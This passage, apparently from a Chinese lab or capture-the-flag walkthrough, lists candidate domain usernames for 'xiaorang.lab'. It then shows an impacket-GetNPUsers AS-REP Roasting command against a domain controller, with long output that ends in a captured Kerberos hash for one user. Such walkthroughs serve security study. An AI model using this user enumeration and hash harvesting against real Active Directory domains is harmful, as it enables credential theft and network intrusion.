class=\"line\">qiaode</span><br><span class=\"line\">qiaomei</span><br><span class=\"line\">qidiaofang</span><br><span class=\"line\">qiguanrou</span><br><span class=\"line\">qijie</span><br><span class=\"line\">qinguan</span><br><span class=\"line\">qiruo</span><br><span class=\"line\">qiyan</span><br><span class=\"line\">qiyong</span><br><span class=\"line\">qiyuan</span><br><span class=\"line\">qiyue</span><br><span class=\"line\">qizhu</span><br><span class=\"line\">qulu</span><br><span class=\"line\">rangsibo</span><br><span class=\"line\">ranqun</span><br><span class=\"line\">rongbiao</span><br><span class=\"line\">rongxianyu</span><br><span class=\"line\">ruanyong</span><br><span class=\"line\">rubao</span><br><span class=\"line\">ruibei</span><br><span class=\"line\">ruilin</span><br><span class=\"line\">ruishi</span><br><span class=\"line\">ruisong</span><br><span class=\"line\">shangjie</span><br><span class=\"line\">shangjun</span><br><span class=\"line\">shangqian</span><br><span class=\"line\">shanshao</span><br><span class=\"line\">shaocai</span><br><span class=\"line\">shaokang</span><br><span class=\"line\">shaoting</span><br><span class=\"line\">shaoyi</span><br><span class=\"line\">shengzhe</span><br><span class=\"line\">shenhang</span><br><span class=\"line\">shenjiao</span><br><span class=\"line\">shenshan</span><br><span class=\"line\">shenshan</span><br><span class=\"line\">shentuyun</span><br><span class=\"line\">sheweiyue</span><br><span class=\"line\">shie</span><br><span class=\"line\">shijian</span><br><span class=\"line\">shijun</span><br><span class=\"line\">shilan</span><br><span class=\"line\">shishu</span><br><span class=\"line\">shouchun</span><br><span class=\"line\">shoujuan</span><br><span class=\"line\">shuangchen</span><br><span class=\"line\">shudi</span><br><span class=\"line\">shuicheng</span><br><span class=\"line\">shuifei</span><br><span class=\"line\">shushi</span><br><span class=\"line\">shuzhen</span><br><span class=\"line\">sisiwu</span><br><span class=\"line\">situxin</span><br><span class=\"line\">siyi</span><br><span class=\"line\">songming</span><br><span class=\"line\">songqin</span><br><span class=\"line\">songyan</span><br><span class=\"line\">sunduangu</span><br><span class=\"line\">sunli</span><br><span class=\"line\">sunmei</span><br><span class=\"line\">sunzhongda</span><br><span class=\"line\">taigongyuan</span><br><span class=\"line\">tanggui</span><br><span class=\"line\">tangqiao</span><br><span class=\"line\">tangrong</span><br><span class=\"line\">tangshun</span><br><span class=\"line\">taoya</span><br><span class=\"line\">tianxin</span><br><span class=\"line\">tongdong</span><br><span class=\"line\">tonghao</span><br><span class=\"line\">tongxue</span><br><span class=\"line\">wangnuo</span><br><span class=\"line\">wangxing</span><br><span class=\"line\">wangyan</span><br><span class=\"line\">wangyan</span><br><span class=\"line\">wangying</span><br><span class=\"line\">wansifei</span><br><span class=\"line\">wansifu</span><br><span class=\"line\">wansishun</span><br><span class=\"line\">wanyan</span><br><span class=\"line\">weicheng</span><br><span class=\"line\">weichipeng</span><br><span class=\"line\">weigong</span><br><span class=\"line\">weihua</span><br><span class=\"line\">weihui</span><br><span class=\"line\">weiliang</span><br><span class=\"line\">weishengshan</span><br><span class=\"line\">weiwan</span><br><span class=\"line\">weixian</span><br><span class=\"line\">weixian</span><br><span class=\"line\">weixue</span><br><span class=\"line\">wenbiao</span><br><span class=\"line\">wenbo</span><br><span class=\"line\">wendong</span><br><span class=\"line\">wengbang</span><br><span class=\"line\">wengong</span><br><span class=\"line\">wenliang</span><br><span class=\"line\">wenshao</span><br><span class=\"line\">wohong</span><br><span class=\"line\">wohua</span><br><span class=\"line\">wuce</span><br><span class=\"line\">wuda</span><br><span class=\"line\">wuhuan</span><br><span class=\"line\">wulun</span><br><span class=\"line\">wunuo</span><br><span class=\"line\">xiahan</span><br><span class=\"line\">xiai</span><br><span class=\"line\">xiamao</span><br><span class=\"line\">xiangdong</span><br><span class=\"line\">xiangjuan</span><br><span class=\"line\">xiangqian</span><br><span class=\"line\">xiangxin</span><br><span class=\"line\">xiangyu</span><br><span class=\"line\">xiaojin</span><br><span class=\"line\">xiaorong</span><br><span class=\"line\">xiayu</span><br><span class=\"line\">xieyi</span><br><span class=\"line\">xijun</span><br><span class=\"line\">ximenshi</span><br><span class=\"line\">xingquan</span><br><span class=\"line\">xingxi</span><br><span class=\"line\">xingye</span><br><span class=\"line\">xionghong</span><br><span class=\"line\">xiqi</span><br><span class=\"line\">xiqidi</span><br><span class=\"line\">xixia</span><br><span class=\"line\">xiyao</span><br><span class=\"line\">xiyi</span><br><span class=\"line\">xuanjiang</span><br><span class=\"line\">xuanlu</span><br><span class=\"line\">xuanqun</span><br><span class=\"line\">xudi</span><br><span class=\"line\">xuehe</span><br><span class=\"line\">xundi</span><br><span class=\"line\">xupeng</span><br><span class=\"line\">xuxin</span><br><span class=\"line\">yangdanhan</span><br><span class=\"line\">yangdanhe</span><br><span class=\"line\">yangju</span><br><span class=\"line\">yanglang</span><br><span class=\"line\">yanguo</span><br><span class=\"line\">yanji</span><br><span class=\"line\">yanjin</span><br><span class=\"line\">yanqian</span><br><span class=\"line\">yanyangmei</span><br><span class=\"line\">yanyue</span><br><span class=\"line\">yanyun</span><br><span class=\"line\">yanzhen</span><br><span class=\"line\">yetai</span><br><span class=\"line\">yexing</span><br><span class=\"line\">yezongyue</span><br><span class=\"line\">yifu</span><br><span class=\"line\">yinbin</span><br><span class=\"line\">yinchen</span><br><span class=\"line\">yingbiao</span><br><span class=\"line\">yingchan</span><br><span class=\"line\">yingjun</span><br><span class=\"line\">yingpeng</span><br><span class=\"line\">yingshi</span><br><span class=\"line\">yinyu</span><br><span class=\"line\">yixue</span><br><span class=\"line\">youchao</span><br><span class=\"line\">youyi</span><br><span class=\"line\">yuanchang</span><br><span class=\"line\">yubo</span><br><span class=\"line\">yufen</span><br><span class=\"line\">yuhui</span><br><span class=\"line\">yuhui</span><br><span class=\"line\">yujian</span><br><span class=\"line\">yujun</span><br><span class=\"line\">yuling</span><br><span class=\"line\">yulvxue</span><br><span class=\"line\">yunhui</span><br><span class=\"line\">yunqian</span><br><span class=\"line\">yunzhong</span><br><span class=\"line\">yurui</span><br><span class=\"line\">yusha</span><br><span class=\"line\">yuwan</span><br><span class=\"line\">yuxi</span><br><span class=\"line\">yuxiao</span><br><span class=\"line\">zangpeng</span><br><span class=\"line\">zangyao</span><br><span class=\"line\">zhangxin</span><br><span class=\"line\">zhangzhao</span><br><span class=\"line\">zhannan</span><br><span class=\"line\">zhaoxiu</span><br><span class=\"line\">zhenglu</span><br><span class=\"line\">zhengpubei</span><br><span class=\"line\">zhengxiao</span><br><span class=\"line\">zhenhui</span><br><span class=\"line\">zhenjun</span><br><span class=\"line\">zhenyan</span><br><span class=\"line\">zhongliying</span><br><span class=\"line\">zhouchun</span><br><span class=\"line\">zhoujing</span><br><span class=\"line\">zhoujun</span><br><span class=\"line\">zhouqi</span><br><span class=\"line\">zhouya</span><br><span class=\"line\">zhouyi</span><br><span class=\"line\">zhuangsong</span><br><span class=\"line\">zhubin</span><br><span class=\"line\">zhufeng</span><br><span class=\"line\">zhuke</span><br><span class=\"line\">zhuli</span><br><span class=\"line\">zhupeng</span><br><span class=\"line\">zhupeng</span><br><span class=\"line\">zhuqin</span><br><span class=\"line\">zhuzhu</span><br><span class=\"line\">zizhuansong</span><br><span class=\"line\">zizhuanyu</span><br><span class=\"line\">zizhuanzhi</span><br><span class=\"line\">zoubao</span><br><span class=\"line\">zoufu</span><br><span class=\"line\">zouqi</span><br><span class=\"line\">zuofen</span><br><span class=\"line\">zuoqiufa</span><br><span class=\"line\">zuoqiutai</span><br><span class=\"line\">zuoshun</span><br></pre></td></tr></table></figure>\n\n<p>然后对域控进行<strong>Kerberos AS-REP Roasting</strong> 攻击</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.6.12 -usersfile username -format hashcat</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User pangzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] User pengyuan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User qiaomei doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User qiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User rangsibo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User rubao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User sheweiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User shuzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User tangrong doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] User tangshun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User weicheng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User weishengshan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User wenbiao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] User wenbo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User wengbang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User wenliang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User wohua doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User xiqidi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User xiyi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH 